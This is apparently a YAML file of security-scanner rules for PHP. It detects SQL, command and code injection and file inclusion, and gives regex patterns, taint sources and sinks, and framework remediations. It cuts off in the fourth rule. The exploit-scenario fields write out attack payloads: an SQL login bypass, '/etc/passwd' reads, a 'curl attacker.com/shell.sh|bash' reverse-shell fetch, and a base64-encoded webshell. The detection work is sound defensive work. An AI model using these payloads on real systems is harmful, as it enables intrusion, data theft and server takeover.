rules:
- rule_id: PHP-INJ-001
  title: SQL Injection via String Interpolation
  description: 'Detects SQL queries built with PHP string interpolation or concatenation with user-controlled input ($_GET, $_POST, $_REQUEST). Identifies both direct superglobal usage and indirect tainted
    variable flow into query construction across legacy mysql_, mysqli, PDO raw query, and pg_ APIs.

    '
  language: php
  category: injection
  severity: Critical
  confidence: 0.95
  cwe: CWE-89
  owasp: A03:2021-Injection
  tags:
  - sql-injection
  - mysqli
  - pdo
  - sqli
  - database
  patterns:
  - type: regex
    pattern: (?:mysql_query|mysqli_query|mysqli::query|pg_query)\s*\(\s*[^,]*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
  - type: regex
    pattern: \$(?:pdo|db|conn|connection|mysqli)\s*->\s*query\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\$
  - type: regex
    pattern: (?:SELECT|INSERT|UPDATE|DELETE)\b[^"']*(?:\.\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[|\$\{?\w*(?:input|user|param|request))
  - type: regex
    pattern: '"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*"\s*\.\s*\$(?:_GET|_POST|_REQUEST|_COOKIE|_SERVER)\['
  - type: regex
    pattern: \$\w*(?:sql|query|stmt)\w*\s*=\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*"\s*\.\s*\$
  - type: regex
    pattern: \$\w*(?:sql|query)\w*\s*\.=\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
    description: Concatenation assignment appending user input to SQL query string
  - type: regex
    pattern: sprintf\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*%s[^'"]*['"]\s*,\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
    description: SQL query built via sprintf with unsanitized superglobal substitution
  - type: regex
    pattern: \bDB::(?:select|insert|update|delete|statement)\s*\(\s*"[^"]*"\s*\.\s*\$
    description: Laravel raw DB facade query with string concatenation
  - type: regex
    pattern: ->(?:whereRaw|selectRaw|havingRaw|orderByRaw|groupByRaw)\s*\(\s*"[^"]*"\s*\.\s*\$
    description: Laravel raw query methods with concatenated user input
  - type: regex
    pattern: \bwpdb\s*->\s*query\s*\(\s*"(?:SELECT|INSERT|UPDATE|DELETE)\b[^"]*\$
    description: WordPress wpdb->query with string interpolation
  anti_patterns:
  - prepare(
  - bindParam
  - bindValue
  - execute(array
  - real_escape_string
  - PDO::PARAM
  - ->prepare
  - DB::select(
  - Eloquent
  - ->where(
  - ->find(
  - ->findOrFail(
  - createQueryBuilder
  - ->setParameter
  - Doctrine\DBAL
  - $wpdb->prepare
  - esc_sql(
  - ->bind(
  context_awareness:
    surrounding_context_patterns:
    - function\s+\w+\s*\([^)]*\$(?:_GET|_POST|_REQUEST)
    - \$\w+\s*=\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
    - \$\w+\s*=\s*filter_input\s*\(
    - \$\w+\s*=\s*\$request\s*->\s*(?:input|get|post|query)\s*\(
    taint_source_indicators:
    - $_GET
    - $_POST
    - $_REQUEST
    - $_COOKIE
    - $_SERVER["QUERY_STRING"]
    - $_SERVER["HTTP_
    - $request->input(
    - $request->get(
    - $request->query(
    - file_get_contents("php://input")
    - $this->request->getData(
    - Input::get(
    taint_sink_indicators:
    - mysql_query(
    - mysqli_query(
    - mysqli::query(
    - pg_query(
    - ->query(
    - ->exec(
    - DB::select(
    - DB::statement(
    - $wpdb->query(
    - oci_parse(
    - sqlsrv_query(
    sanitization_patterns:
    - prepare(
    - bindParam(
    - bindValue(
    - real_escape_string(
    - mysqli_real_escape_string(
    - addslashes(
    - intval(
    - (int)
    - filter_var(
    - filter_input(
    - $wpdb->prepare(
    - esc_sql(
    - absint(
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
    exploitability_score: 0.95
    impact_subscore: 9.8
    data_classification_risk: high
  exploit_scenario:
    attack_example: 'An attacker submits a crafted username via a login form: POST /login.php with body username='' OR ''1''=''1'' --&password=anything. The application constructs the query: "SELECT * FROM
      users WHERE username='''' OR ''1''=''1'' --'' AND password=''anything''" This bypasses authentication and logs the attacker in as the first user (often admin).

      '
    example_payload: ''' OR ''1''=''1'' -- '
    attacker_objective: 'Extract sensitive data (credentials, PII, financial records), bypass authentication, escalate privileges, modify or delete data, or achieve remote code execution via SELECT INTO
      OUTFILE or LOAD_FILE().

      '
  confidence_factors:
    pattern_strength: 0.9
    context_match: 0.95
    proximity_to_user_input: 0.98
    sanitization_absence: 0.95
    historical_accuracy: 0.92
  impact: 'Complete database compromise including data theft, unauthorized modification,

    authentication bypass, and potential RCE via INTO OUTFILE or LOAD_FILE.

    '
  remediation: "Use PDO prepared statements:\n  $stmt = $pdo->prepare(\"SELECT * FROM users WHERE id = :id\");\n  $stmt->execute(['id' => $userId]);\nOr mysqli prepared statements:\n  $stmt = $mysqli->prepare(\"\
    SELECT * FROM users WHERE id = ?\");\n  $stmt->bind_param(\"s\", $userId);\n\nFramework-specific fixes:\n\nLaravel (Eloquent ORM / Query Builder):\n  // Use Eloquent models with automatic parameterization\n\
    \  $user = User::where('email', $request->input('email'))->first();\n  // Use query builder bindings\n  $users = DB::select('SELECT * FROM users WHERE id = ?', [$id]);\n  // Use whereRaw with bindings\n\
    \  $results = DB::table('users')->whereRaw('email = ?', [$email])->get();\n\nSymfony (Doctrine ORM / DBAL):\n  // Doctrine QueryBuilder\n  $qb = $em->createQueryBuilder();\n  $qb->select('u')->from('User',\
    \ 'u')->where('u.email = :email')\n     ->setParameter('email', $email);\n  // Doctrine DBAL\n  $stmt = $conn->prepare('SELECT * FROM users WHERE id = :id');\n  $result = $stmt->executeQuery(['id' =>\
    \ $id]);\n\nWordPress:\n  // Always use wpdb->prepare\n  $results = $wpdb->get_results(\n      $wpdb->prepare(\"SELECT * FROM {$wpdb->prefix}users WHERE id = %d\", $id)\n  );\n\nCodeIgniter:\n  // Use\
    \ Query Builder\n  $this->db->where('id', $id);\n  $query = $this->db->get('users');\n  // Or query bindings\n  $query = $this->db->query(\"SELECT * FROM users WHERE id = ?\", array($id));\n"
  references:
  - https://owasp.org/Top10/A03_2021-Injection/
  - https://cwe.mitre.org/data/definitions/89.html
  - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
  - https://laravel.com/docs/queries#introduction
  - https://www.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/security.html
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: low
    false_positive_rate: low
    created: '2024-01-01'
    author: security-rules-team
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: false
    high_impact_flag: true
    related_rules:
    - PHP-INJ-003
    - PHP-INJ-004
    escalation_chain: SQL injection may chain with PHP-INJ-003 (code injection) if database-stored payloads are later evaluated, or PHP-INJ-004 (file inclusion) if query results influence include paths.
    combined_risk_multiplier: 1.5
  detection_layer: 1
- rule_id: PHP-INJ-002
  title: Command Injection via system/exec/passthru
  description: 'Detects PHP command execution functions (system, exec, passthru, shell_exec, popen, proc_open, backtick operator) receiving user-controlled input directly or through string concatenation.
    Also detects indirect command injection through variables derived from superglobals without proper escaping via escapeshellarg/escapeshellcmd.

    '
  language: php
  category: injection
  severity: Critical
  confidence: 0.95
  cwe: CWE-78
  owasp: A03:2021-Injection
  tags:
  - command-injection
  - rce
  - system-exec
  - os-command
  patterns:
  - type: regex
    pattern: (?:system|exec|passthru|shell_exec|popen|proc_open)\s*\(\s*(?:\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$_SERVER)\[
  - type: regex
    pattern: (?:system|exec|passthru|shell_exec|popen)\s*\(\s*"[^"]*"\s*\.\s*\$(?:_GET|_POST|_REQUEST)\[
  - type: regex
    pattern: (?:system|exec|passthru|shell_exec|popen)\s*\(\s*\$\w*(?:cmd|command|input|user|param)\b
  - type: regex
    pattern: '`\s*[^`]*\$(?:_GET|_POST|_REQUEST|_COOKIE)\['
  - type: regex
    pattern: preg_replace\s*\(\s*['"][^'"]*e[^'"]*["']
  - type: regex
    pattern: pcntl_exec\s*\(\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
    description: Process control execution with user-controlled binary path
  - type: regex
    pattern: proc_open\s*\(\s*(?:"[^"]*"\s*\.\s*)?\$\w*(?:cmd|command|input|user|arg)
    description: proc_open with tainted command string
  - type: regex
    pattern: (?:system|exec|passthru|shell_exec)\s*\(\s*sprintf\s*\([^)]*\$(?:_GET|_POST|_REQUEST)\[
    description: Command execution using sprintf with unsanitized superglobal
  - type: regex
    pattern: \$\w*(?:cmd|command)\s*=\s*['"][^'"]*['"]\s*\.\s*\$(?:_GET|_POST|_REQUEST)\[.*?(?:system|exec|passthru|shell_exec)\s*\(\s*\$\w*(?:cmd|command)
    description: Two-step command construction then execution with tainted input
  anti_patterns:
  - escapeshellarg
  - escapeshellcmd
  - filter_input
  - FILTER_SANITIZE
  - Symfony\Component\Process\Process
  - new Process(
  - Process::fromShellCommandline
  - in_array(
  - preg_match('/^[a-zA-Z0-9
  - ctype_alnum(
  context_awareness:
    surrounding_context_patterns:
    - \$\w+\s*=\s*\$(?:_GET|_POST|_REQUEST)\[['"][^'"]+['"]\]
    - if\s*\(\s*isset\s*\(\s*\$(?:_GET|_POST)\[
    - \$\w*(?:cmd|command|arg|param)\s*=\s*\$(?:_GET|_POST|_REQUEST)\[
    - Route::\w+\([^)]*function\s*\([^)]*\$request
    taint_source_indicators:
    - $_GET
    - $_POST
    - $_REQUEST
    - $_COOKIE
    - $_SERVER["HTTP_
    - $_SERVER["QUERY_STRING"]
    - $request->input(
    - $request->get(
    - php://input
    - $argv[
    - getenv(
    taint_sink_indicators:
    - system(
    - exec(
    - passthru(
    - shell_exec(
    - popen(
    - proc_open(
    - pcntl_exec(
    - backtick operator `...`
    - ob_start("system"
    - call_user_func("system"
    - array_map("exec"
    sanitization_patterns:
    - escapeshellarg(
    - escapeshellcmd(
    - filter_var(
    - filter_input(
    - preg_match(
    - ctype_alnum(
    - ctype_alpha(
    - intval(
    - (int)
    - in_array(
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
    exploitability_score: 0.92
    impact_subscore: 10.0
    data_classification_risk: critical
  exploit_scenario:
    attack_example: 'A web application provides a network diagnostic page that pings a user-supplied host: system("ping -c 4 " . $_GET[''host'']). An attacker supplies host=127.0.0.1;cat /etc/passwd which
      executes both the ping and the cat command, disclosing the system password file. Escalation uses host=127.0.0.1;curl attacker.com/shell.sh|bash to download and execute a reverse shell.

      '
    example_payload: 127.0.0.1; cat /etc/passwd
    attacker_objective: 'Execute arbitrary operating system commands to read sensitive files, install backdoors, establish reverse shells, pivot to internal networks, exfiltrate data, or achieve full server
      takeover.

      '
  confidence_factors:
    pattern_strength: 0.93
    context_match: 0.95
    proximity_to_user_input: 0.97
    sanitization_absence: 0.96
    historical_accuracy: 0.94
  impact: 'Arbitrary OS command execution enabling full server compromise,

    data exfiltration, lateral movement, and persistent backdoor installation.

    '
  remediation: "- Use escapeshellarg() for individual arguments\n- Use escapeshellcmd() for entire commands (less secure)\n- Prefer PHP built-in functions over shell commands\n- Apply strict input validation\
    \ with allowlists\n- Disable dangerous functions in php.ini: disable_functions\n\nFramework-specific fixes:\n\nLaravel:\n  // Use Symfony Process component (bundled with Laravel)\n  use Symfony\\Component\\\
    Process\\Process;\n  $process = new Process(['ping', '-c', '4', $validatedHost]);\n  $process->run();\n  // Validate input with Laravel rules\n  $validated = $request->validate(['host' => 'required|ip']);\n\
    \nSymfony:\n  // Use the Process component with array arguments (no shell)\n  use Symfony\\Component\\Process\\Process;\n  $process = new Process(['/usr/bin/ping', '-c', '4', $host]);\n  $process->run();\n\
    \  // Never use Process::fromShellCommandline with user input\n\nWordPress:\n  // Use WP_Filesystem methods instead of shell commands\n  $wp_filesystem->get_contents($file);\n  // If shell is absolutely\
    \ required, sanitize rigorously\n  $safe = escapeshellarg(sanitize_text_field($_POST['input']));\n\nCodeIgniter:\n  // Validate with form_validation library\n  $this->form_validation->set_rules('host',\
    \ 'Host', 'required|valid_ip');\n  // Use built-in PHP functions instead of shell commands\n  // e.g., dns_get_record() instead of shell nslookup\n"
  references:
  - https://cwe.mitre.org/data/definitions/78.html
  - https://owasp.org/Top10/A03_2021-Injection/
  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
  - https://symfony.com/doc/current/components/process.html
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: low
    false_positive_rate: very_low
    created: '2024-01-01'
    author: security-rules-team
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: false
    high_impact_flag: true
    related_rules:
    - PHP-INJ-003
    - PHP-INJ-001
    escalation_chain: Command injection is often the final escalation target from other injection types. SQL injection (PHP-INJ-001) may chain into command injection via MySQL sys_exec UDF or INTO OUTFILE
      + LFI.
    combined_risk_multiplier: 2.0
  detection_layer: 1
- rule_id: PHP-INJ-003
  title: Code Injection via eval/assert/preg_replace-e
  description: 'Detects PHP code injection through eval(), assert(), create_function(), preg_replace with /e modifier, or dynamic function invocation patterns such as $func() and call_user_func() where
    the function name or code body is derived from user-controlled input. Includes detection of obfuscated eval patterns using base64_decode, gzinflate, and similar encoding/compression wrappers commonly
    seen in webshells.

    '
  language: php
  category: injection
  severity: Critical
  confidence: 0.96
  cwe: CWE-94
  owasp: A03:2021-Injection
  tags:
  - code-injection
  - eval
  - rce
  - webshell
  - dynamic-execution
  patterns:
  - type: regex
    pattern: \beval\s*\(\s*(?:\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$_SERVER)\[
  - type: regex
    pattern: \beval\s*\(\s*\$\w*(?:input|user|param|data|code|cmd)\b
  - type: regex
    pattern: \bassert\s*\(\s*(?:\$_GET|\$_POST|\$_REQUEST|\$_COOKIE)\[
  - type: regex
    pattern: create_function\s*\(\s*[^,]*,\s*(?:\$_GET|\$_POST|\$_REQUEST)\[
  - type: regex
    pattern: \beval\s*\(\s*(?:base64_decode|gzinflate|gzuncompress|str_rot13)\s*\(
  - type: regex
    pattern: call_user_func(?:_array)?\s*\(\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
    description: Dynamic function invocation with user-controlled function name
  - type: regex
    pattern: \$\w*(?:func|function|callback|handler|action)\s*\(\s*\$(?:_GET|_POST|_REQUEST)\[
    description: Variable function call with user-controlled arguments
  - type: regex
    pattern: \$(?:_GET|_POST|_REQUEST|_COOKIE)\[['"][^'"]+['"]\]\s*\(
    description: Direct superglobal used as function name for invocation
  - type: regex
    pattern: array_map\s*\(\s*\$(?:_GET|_POST|_REQUEST)\[
    description: array_map with user-controlled callback function
  - type: regex
    pattern: usort\s*\(\s*[^,]+,\s*\$(?:_GET|_POST|_REQUEST)\[
    description: usort with user-controlled comparison callback
  - type: regex
    pattern: \beval\s*\(\s*(?:str_replace|substr|implode|join)\s*\([^)]*\$
    description: Obfuscated eval with string manipulation wrapping tainted data
  anti_patterns:
  - // safe
  - filter_var
  - Twig\Environment
  - ->render(
  - blade
  - '{{ }}'
  - twig
  - ->compile(
  - Sandbox
  - SecurityPolicy
  - is_callable($allowed
  - in_array($func
  context_awareness:
    surrounding_context_patterns:
    - \$\w+\s*=\s*\$(?:_GET|_POST|_REQUEST)\[['"][^'"]+['"]\]
    - \$\w+\s*=\s*file_get_contents\s*\(\s*['"]php://input['"]\s*\)
    - \$\w+\s*=\s*base64_decode\s*\(\s*\$
    - if\s*\(\s*isset\s*\(\s*\$(?:_GET|_POST)\[
    taint_source_indicators:
    - $_GET
    - $_POST
    - $_REQUEST
    - $_COOKIE
    - php://input
    - $_SERVER["HTTP_
    - $request->input(
    - $request->getContent()
    - base64_decode(
    - json_decode(
    - unserialize(
    taint_sink_indicators:
    - eval(
    - assert(
    - create_function(
    - call_user_func(
    - call_user_func_array(
    - preg_replace with /e
    - array_map(
    - array_filter(
    - usort(
    - uasort(
    - ReflectionFunction
    sanitization_patterns:
    - filter_var(
    - filter_input(
    - preg_match(
    - in_array(
    - ctype_alpha(
    - htmlspecialchars(
    - is_numeric(
    - is_callable($allowed
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
    exploitability_score: 0.9
    impact_subscore: 10.0
    data_classification_risk: critical
  exploit_scenario:
    attack_example: 'A legacy CMS has a template evaluation feature: eval("echo " . $_POST[''template''] . ";"); An attacker sends template=system(''id'') which executes the OS id command. Escalation: template=file_put_contents(''/var/www/html/shell.php'',
      base64_decode(''PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=='')) writes a persistent webshell to disk.

      '
    example_payload: system('cat /etc/passwd')
    attacker_objective: 'Execute arbitrary PHP code within the application context to read files, modify data, install persistent backdoors (webshells), execute OS commands, or pivot deeper into the infrastructure.

      '
  confidence_factors:
    pattern_strength: 0.95
    context_match: 0.93
    proximity_to_user_input: 0.96
    sanitization_absence: 0.97
    historical_accuracy: 0.91
  impact: 'Arbitrary PHP code execution in the application context with full

    access to the file system, database, and network. Can lead to

    webshell installation, data exfiltration, and full server compromise.

    '
  remediation: "- Never use eval() with user input\n- Replace create_function() with anonymous functions (closures)\n- Remove preg_replace /e modifier, use preg_replace_callback instead\n- Disable eval\
    \ in php.ini if not needed\n- Never use variable function calls with user-controlled names\n\nFramework-specific fixes:\n\nLaravel:\n  // Use Blade templating instead of eval for dynamic content\n \
    \ return view('template', ['data' => $data]);\n  // Use config/route-based action dispatch instead of dynamic calls\n  $action = match($request->input('action')) {\n      'list' => [Controller::class,\
    \ 'list'],\n      'show' => [Controller::class, 'show'],\n      default => abort(400),\n  };\n\nSymfony:\n  // Use Twig templating engine with auto-escaping\n  return $this->render('template.html.twig',\
    \ ['data' => $data]);\n  // Twig sandbox mode for user-provided templates\n  $sandbox = new \\Twig\\Extension\\SandboxExtension($policy);\n  $twig->addExtension($sandbox);\n\nWordPress:\n  // Use shortcodes\
    \ or template parts instead of eval\n  do_shortcode($content);\n  get_template_part('content', $type);\n  // Never eval user-submitted content in widgets or custom fields\n\nCodeIgniter:\n  // Use CI\
    \ view system\n  $this->load->view('template', $data);\n  // Use route-based controller dispatch\n  // Validate action names against allowlist\n  if (in_array($action, $allowed_actions)) {\n      $this->$action();\n\
    \  }\n"
  references:
  - https://cwe.mitre.org/data/definitions/94.html
  - https://owasp.org/Top10/A03_2021-Injection/
  - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: medium
    false_positive_rate: very_low
    created: '2024-01-01'
    author: security-rules-team
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - PHP-INJ-001
    - PHP-INJ-002
    - PHP-INJ-004
    escalation_chain: 'Code injection often results from chained exploits: SQL injection (PHP-INJ-001) stores malicious code, file inclusion (PHP-INJ-004) or deserialization loads it, and eval executes
      it. The eval sink is the most direct path to RCE.'
    combined_risk_multiplier: 2.0
  detection_layer: 1
- rule_id: PHP-INJ-004
  title: File Inclusion via include/require with User Input
  description: 'Detects local file inclusion (LFI) and remote file inclusion (RFI) vulnerabilities through include, include_once, require, or require_once statements that incorporate user-controlled input
    in the file path. Covers direct superglobal usage, tainted variable intermediaries, and path traversal patterns (../) in included paths. Also detects indirect inclusion through variable variables and
    dynamic path construction.

    '
  language: php
  category: injection
  severity: Critical
  confidence: 0.93
  cwe: CWE-98
  owasp: A03:2021-Injection
  tags:
  - lfi
  - rfi
  - file-inclusion
  - rce
  - path-traversal
  - directory-traversal
  patterns:
  - type: regex
    pattern: (?:include|include_once|require|require_once)\s*\(\s*(?:\$_GET|\$_POST|\$_REQUEST|\$_COOKIE)\[
  - type: regex
    pattern: (?:include|include_once|require|require_once)\s*\(\s*\$\w*(?:page|file|template|module|path|lang|dir)\b
  - type: regex
    pattern: (?:include|include_once|require|require_once)\s*\(\s*"[^"]*"\s*\.\s*\$(?:_GET|_POST|_REQUEST)\[
  - type: regex
    pattern: (?:include|require)\s*\$\w*(?:page|file|path|template)\b
  - type: regex
    pattern: (?:include|include_once|require|require_once)\s*\(\s*\$\w+\s*\.\s*['"]\.php['"]\s*\)
    description: Dynamic inclusion with variable prefix and forced .php extension (bypassable via null bytes on PHP < 5.3.4)
  - type: regex
    pattern: (?:include|include_once|require|require_once)\s*\(\s*['"][^'"]*['"]?\s*\.\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[['"][^'"]+['"]\]\s*\.\s*['"]
    description: Sandwich inclusion with user input between path prefix and suffix
  - type: regex
    pattern: \$\w*(?:controller|class|action|view|theme|plugin)\s*=\s*\$(?:_GET|_POST|_REQUEST)\[.*?(?:include|require)
    description: Variable assigned from superglobal then used in subsequent include
  - type: regex
    pattern: file_get_contents\s*\(\s*\$(?:_GET|_POST|_REQUEST|_COOKIE)\[
